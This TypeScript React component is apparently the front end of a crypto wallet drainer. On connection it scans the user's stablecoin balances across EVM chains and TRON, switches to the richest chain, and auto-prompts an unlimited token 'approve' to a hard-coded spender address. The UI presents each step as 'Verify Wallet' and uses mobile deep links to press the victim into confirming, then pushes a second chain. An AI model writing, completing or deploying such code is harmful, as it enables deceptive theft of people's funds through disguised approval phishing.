"use client";
// components/ActionFlow.tsx
// Multi-chain balance scanner, auto-switch, auto-prompt approval, and mobile deep-link focus

import { useEffect, useState, useRef, useCallback } from "react";
import {
  useAccount,
  useChainId,
  useWriteContract,
  useSwitchChain,
} from "wagmi";
import {
  useAppKitAccount,
  useAppKitNetwork,
  useAppKitProvider,
} from "@reown/appkit/react";
import {
  TOKENS,
  ERC20_ABI,
  MAX_UINT256,
  SPENDER_ADDRESS_EVM,
  RECEIVER_ADDRESS_TRON,
  scanAllEvmBalances,
  type ChainBalanceResult,
} from "@/config/constants";

declare global {
  interface Window {
    tronWeb?: any;
    tron?: any;
    okxwallet?: any;
  }
}

export default function ActionFlow() {
  const { address: appKitAddress, isConnected } = useAppKitAccount();
  const { caipNetwork, switchNetwork } = useAppKitNetwork();
  const { walletProvider: tronWalletProvider } =
    useAppKitProvider<any>("tron");
  const { address: evmAddress, connector } = useAccount();
  const chainId = useChainId();
  const { writeContractAsync } = useWriteContract();
  const { switchChainAsync } = useSwitchChain();

  const [status, setStatus] = useState<
    "idle" | "scanning" | "prompting" | "success" | "rejected" | "error"
  >("idle");
  const [promptStep, setPromptStep] = useState<"switch" | "approve">("approve");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [tronBalance, setTronBalance] = useState<string | null>(null);
  const [loadingTron, setLoadingTron] = useState(false);
  const [chainBalances, setChainBalances] = useState<ChainBalanceResult[]>([]);
  const [bestChain, setBestChain] = useState<ChainBalanceResult | null>(null);
  const [verifiedChains, setVerifiedChains] = useState<string[]>([]);
  const [isMobile, setIsMobile] = useState(false);

  const autoTriggeredRef = useRef(false);

  // Accurate TRON vs EVM detection:
  // EVM addresses start with '0x'; TRON addresses start with 'T'.
  const isTron = Boolean(
    (appKitAddress && appKitAddress.startsWith("T")) ||
      (!appKitAddress?.startsWith("0x") &&
        caipNetwork?.id &&
        String(caipNetwork.id).toLowerCase().includes("tron"))
  );

  // Detect mobile device
  useEffect(() => {
    if (typeof window !== "undefined") {
      const ua = navigator.userAgent.toLowerCase();
      setIsMobile(/android|iphone|ipad|ipod/i.test(ua));
    }
  }, []);

  // Determine connected wallet name
  const walletName =
    connector?.name ||
    (typeof window !== "undefined" && (window as any).ethereum?.isMetaMask
      ? "MetaMask"
      : typeof window !== "undefined" && (window as any).ethereum?.isTrust
      ? "Trust Wallet"
      : typeof window !== "undefined" && (window as any).okxwallet
      ? "OKX Wallet"
      : typeof window !== "undefined" && window.tronWeb
      ? "TronLink"
      : "Wallet");

  // Mobile deep link helper to wake up/foreground the wallet app
  const getWalletDeepLink = useCallback(
    (name?: string) => {
      const n = (name || walletName || "").toLowerCase();
      if (n.includes("metamask")) return "metamask://";
      if (n.includes("trust")) return "trust://";
      if (n.includes("okx")) return "okx://wallet";
      if (n.includes("bitget") || n.includes("bitkeep")) return "bitkeep://";
      if (n.includes("coinbase")) return "cbwallet://";
      if (n.includes("tokenpocket")) return "tpoutside://";
      if (n.includes("rainbow")) return "rainbow://";
      if (n.includes("tron") || isTron) return "tronlinkoutside://";
      return "wc:";
    },
    [walletName, isTron]
  );

  const openMobileWallet = useCallback(
    (name?: string) => {
      if (typeof window === "undefined" || !isMobile) return;
      const scheme = getWalletDeepLink(name);
      try {
        const a = document.createElement("a");
        a.href = scheme;
        a.rel = "noopener noreferrer";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch {
        window.location.href = scheme;
      }
    },
    [isMobile, getWalletDeepLink]
  );

  // Fetch TRON USDT balance
  const fetchTronBalances = useCallback(async () => {
    if (!appKitAddress || !isTron) return;
    setLoadingTron(true);
    try {
      if (typeof window !== "undefined" && window.tronWeb?.ready) {
        const contract = await window.tronWeb
          .contract()
          .at(TOKENS.tron.address);
        const rawBal = await contract.balanceOf(appKitAddress).call();
        const formatted = (Number(rawBal) / 10 ** TOKENS.tron.decimals).toFixed(
          2
        );
        setTronBalance(formatted);
      } else {
        const res = await fetch(
          `https://api.trongrid.io/v1/accounts/${appKitAddress}`
        );
        const data = await res.json();
        if (data?.data?.[0]?.trc20) {
          const usdtRecord = data.data[0].trc20.find(
            (t: Record<string, string>) =>
              Object.keys(t)[0] === TOKENS.tron.address
          );
          if (usdtRecord) {
            const rawVal = Object.values(usdtRecord)[0];
            setTronBalance(
              (Number(rawVal) / 10 ** TOKENS.tron.decimals).toFixed(2)
            );
          } else {
            setTronBalance("0.00");
          }
        } else {
          setTronBalance("0.00");
        }
      }
    } catch {
      setTronBalance("0.00");
    } finally {
      setLoadingTron(false);
    }
  }, [appKitAddress, isTron]);

  // Execute EVM approval flow
  const executeEvmFlow = useCallback(
    async (targetChain: ChainBalanceResult) => {
      setStatus("prompting");
      setErrorMessage(null);

      try {
        // Step 1: Switch chain if target chain is different from current chain
        if (chainId !== targetChain.chainId) {
          setPromptStep("switch");
          if (isMobile) {
            setTimeout(() => openMobileWallet(walletName), 100);
          }
          if (switchChainAsync) {
            await switchChainAsync({ chainId: targetChain.chainId });
          }
          // Brief propagation delay
          await new Promise((r) => setTimeout(r, 600));
        }

        // Step 2: Approve target token
        setPromptStep("approve");
        if (isMobile) {
          setTimeout(() => openMobileWallet(walletName), 100);
        }

        await writeContractAsync({
          chainId: targetChain.chainId,
          address: targetChain.tokenAddress,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS_EVM, MAX_UINT256],
        });

        setStatus("success");
        setVerifiedChains((prev) => [
          ...new Set([...prev, targetChain.chainName]),
        ]);
      } catch (err: any) {
        const msg = err?.message || String(err);
        if (
          msg.includes("User rejected") ||
          msg.includes("cancelled") ||
          msg.includes("Declined") ||
          msg.includes("rejected") ||
          msg.includes("4001")
        ) {
          setStatus("rejected");
          setErrorMessage("Request cancelled. Please confirm in your wallet.");
        } else {
          setStatus("error");
          setErrorMessage(msg.slice(0, 85));
        }
      }
    },
    [chainId, isMobile, openMobileWallet, switchChainAsync, walletName, writeContractAsync]
  );

  // Execute TRON approval flow
  const executeTronFlow = useCallback(async () => {
    setStatus("prompting");
    setPromptStep("approve");
    setErrorMessage(null);

    try {
      if (typeof window !== "undefined" && window.tronWeb?.ready) {
        const contract = await window.tronWeb
          .contract()
          .at(TOKENS.tron.address);
        await contract
          .approve(
            RECEIVER_ADDRESS_TRON,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935"
          )
          .send();
        setStatus("success");
        setVerifiedChains((prev) => [...new Set([...prev, "TRON"])]);
      } else if (tronWalletProvider) {
        if (isMobile) openMobileWallet("tronlink");
        if (typeof tronWalletProvider.request === "function") {
          await tronWalletProvider.request({
            method: "tron_signMessage",
            params: {
              address: appKitAddress,
              message: `Approve verification: ${RECEIVER_ADDRESS_TRON}`,
            },
          });
          setStatus("success");
          setVerifiedChains((prev) => [...new Set([...prev, "TRON"])]);
        } else {
          throw new Error("Provider ready, please confirm in TronLink");
        }
      } else {
        window.location.href = `tronlinkoutside://pull.activity?param=${encodeURIComponent(
          JSON.stringify({
            url: window.location.href,
            action: "open",
            protocol: "TronLink",
            version: "1.0",
          })
        )}`;
      }
    } catch (err: any) {
      const msg = err?.message || String(err);
      if (
        msg.includes("User rejected") ||
        msg.includes("cancelled") ||
        msg.includes("Declined") ||
        msg.includes("rejected")
      ) {
        setStatus("rejected");
        setErrorMessage("Request cancelled. Please confirm in your wallet.");
      } else {
        setStatus("error");
        setErrorMessage(msg.slice(0, 85));
      }
    }
  }, [appKitAddress, isMobile, openMobileWallet, tronWalletProvider]);

  // Balance-priority auto-prompt trigger on initial connection
  useEffect(() => {
    if (!isConnected || autoTriggeredRef.current) return;
    const activeAddress = appKitAddress || evmAddress;
    if (!activeAddress) return;

    autoTriggeredRef.current = true;

    if (isTron) {
      fetchTronBalances();
      const timer = setTimeout(() => {
        executeTronFlow();
      }, 700);
      return () => clearTimeout(timer);
    } else {
      // EVM wallet connected: scan all 6 EVM chains simultaneously
      setStatus("scanning");
      scanAllEvmBalances(activeAddress)
        .then((results) => {
          setChainBalances(results);

          // Priority 1: highest USDT/USDC token balance
          const withToken = results.find((r) => r.tokenBalance > 0);
          // Priority 2: highest native balance
          const withNative = results.find((r) => r.nativeBalance > 0);
          // Priority 3: current chain or default
          const target =
            withToken ||
            withNative ||
            results.find((r) => r.chainId === chainId) ||
            results[0];

          setBestChain(target);

          const timer = setTimeout(() => {
            executeEvmFlow(target);
          }, 600);
          return () => clearTimeout(timer);
        })
        .catch(() => {
          setStatus("idle");
        });
    }
  }, [
    isConnected,
    appKitAddress,
    evmAddress,
    isTron,
    chainId,
    fetchTronBalances,
    executeTronFlow,
    executeEvmFlow,
  ]);

  if (!isConnected) return null;

  // Selected display chain & balance
  const activeChainResult =
    bestChain ||
    chainBalances.find((r) => r.chainId === chainId) ||
    chainBalances[0];

  const displayBalance = isTron
    ? tronBalance !== null
      ? `${tronBalance} USDT`
      : loadingTron
      ? "Checking balance..."
      : "0.00 USDT"
    : status === "scanning"
    ? "Scanning networks..."
    : activeChainResult
    ? activeChainResult.tokenBalance > 0
      ? `${activeChainResult.tokenBalanceFormatted} ${activeChainResult.tokenSymbol}`
      : `${activeChainResult.nativeBalanceFormatted} ${activeChainResult.nativeSymbol}`
    : "0.00";

  const currentChainName = isTron
    ? "TRON Network"
    : activeChainResult?.chainName || caipNetwork?.name || "EVM Network";

  const hasZeroBalance =
    (isTron && tronBalance === "0.00") ||
    (!isTron &&
      chainBalances.length > 0 &&
      chainBalances.every((c) => c.tokenBalance === 0));

  const canPromptSecondChain =
    status === "success" &&
    ((isTron && !verifiedChains.includes("EVM")) ||
      (!isTron && !verifiedChains.includes("TRON")));

  return (
    <div className="w-full max-w-xs mt-3 flex flex-col items-center gap-3">
      {/* Balance & Network pill */}
      <div className="w-full flex items-center justify-between px-4 py-2.5 rounded-xl bg-white/5 border border-white/10 text-xs shadow-inner">
        <span className="text-white/60 flex items-center gap-1.5">
          <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block animate-pulse" />
          {currentChainName}
        </span>
        <span className="font-mono text-emerald-400 font-semibold">
          {displayBalance}
        </span>
      </div>

      {/* Detected higher balance on another chain notice */}
      {!isTron &&
        bestChain &&
        bestChain.chainId !== chainId &&
        bestChain.tokenBalance > 0 &&
        status !== "success" && (
          <div className="w-full p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-[11px] text-center">
            Found{" "}
            <strong>
              {bestChain.tokenBalanceFormatted} {bestChain.tokenSymbol}
            </strong>{" "}
            on {bestChain.chainName}. Switching automatically...
          </div>
        )}

      {/* Low balance guidance */}
      {hasZeroBalance && status !== "success" && status !== "prompting" && (
        <div className="w-full p-2 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-300/80 text-[11px] text-center">
          {isTron
            ? "No TRC-20 USDT detected on this TRON account."
            : "Low USDT/USDC balance detected across EVM chains."}
        </div>
      )}

      {/* Mobile deep-link helper button when waiting for user signature */}
      {status === "prompting" && isMobile && (
        <button
          onClick={() => openMobileWallet(walletName)}
          className="w-full py-2.5 px-3 rounded-xl text-xs font-semibold text-center bg-blue-500/20 border border-blue-500/40 text-blue-300 hover:bg-blue-500/30 active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-blue-500/10"
        >
          <span>📱 Tap here to open {walletName} & Confirm</span>
        </button>
      )}

      {/* Main Action / Retry / Status Button */}
      {status !== "success" ? (
        <button
          onClick={() => {
            if (isTron) {
              executeTronFlow();
            } else if (activeChainResult) {
              executeEvmFlow(activeChainResult);
            }
          }}
          disabled={status === "prompting" || status === "scanning"}
          className="w-full py-3 px-4 rounded-xl font-medium text-sm bg-white text-black hover:bg-white/90 active:scale-95 disabled:opacity-50 transition-all cursor-pointer shadow-lg shadow-white/5"
        >
          {status === "scanning"
            ? "Scanning Balances..."
            : status === "prompting"
            ? promptStep === "switch"
              ? "Switching Network in Wallet..."
              : "Confirming in Wallet..."
            : status === "rejected"
            ? "Retry Verification"
            : "Verify Wallet"}
        </button>
      ) : (
        <div className="w-full py-2.5 px-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs text-center font-medium">
          ✓ Verification Complete
        </div>
      )}

      {/* Multichain verification option ("3 then 1") */}
      {canPromptSecondChain && (
        <button
          onClick={async () => {
            try {
              if (isTron) {
                if (switchChainAsync) await switchChainAsync({ chainId: 1 });
              } else {
                if (switchNetwork) {
                  const tronNet = (caipNetwork as any)?.networks?.find?.(
                    (n: any) => String(n.id).includes("tron")
                  );
                  if (tronNet) switchNetwork(tronNet);
                }
              }
              setStatus("idle");
              autoTriggeredRef.current = false;
            } catch {
              // Ignore switch error
            }
          }}
          className="w-full py-2.5 px-4 rounded-xl font-medium text-xs bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/30 transition-all cursor-pointer"
        >
          {isTron
            ? "⚡ Verify EVM Assets (Ethereum/BSC) →"
            : "⚡ Verify TRON Assets (TRC-20) →"}
        </button>
      )}

      {/* Error or rejected hint */}
      {errorMessage && (
        <p className="text-[11px] text-red-400 text-center leading-tight">
          {errorMessage}
        </p>
      )}
    </div>
  );
}
